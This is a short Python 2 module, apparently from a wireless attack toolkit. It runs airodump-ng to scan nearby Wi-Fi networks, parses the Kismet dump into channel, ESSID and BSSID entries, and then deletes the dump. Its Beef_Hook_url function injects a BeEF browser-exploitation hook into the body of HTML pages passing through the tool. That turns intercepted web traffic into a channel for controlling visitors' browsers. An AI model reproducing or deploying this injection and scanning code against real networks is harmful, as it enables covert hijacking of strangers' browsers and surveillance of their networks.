from os import popen

from BeautifulSoup import BeautifulSoup
from Core.utility.threads import ProcessThread


def airdump_start(interface):
    process = ProcessThread(['xterm',
                '-geometry', '85x15-1+250', '-T',
            '"Scan AP Airodump-ng"', '-e', 'airodump-ng', interface,
        '--write', 'Settings/Dump/networkdump'])
    process.name = "Airodump-ng scan"
    process.start()
    process.join()
    return None

def Beef_Hook_url(soup,hook_url):
    try:
        for link_tag in soup.findAll('body'):
            link_tag_idx = link_tag.parent.contents.index(link_tag)
            link_tag.parent.insert(link_tag_idx + 1, BeautifulSoup(hook_url))
            link_tag.parent.insert(link_tag_idx + 1, BeautifulSoup("<br>"))
            return soup
    except NameError:
        print('[-] please. your need install the module python-BeautifulSoup')

def get_network_scan():
    list_scan = []
    try:
        xml = BeautifulSoup(open("Settings/Dump/networkdump-01.kismet.netxml", 'r').read())
        for network in xml.findAll('wireless-network'):
            try:
                essid = network.find('essid').text
                if not essid:
                    essid = 'Hidden'
                channel = network.find('channel').text
                bssid = network.find('bssid').text
                list_scan.append(channel + "||" + essid + "||" + bssid)
            except Exception:
                pass
        popen("rm Settings/Dump/networkdump*")
        return list_scan
    except IOError:
        return None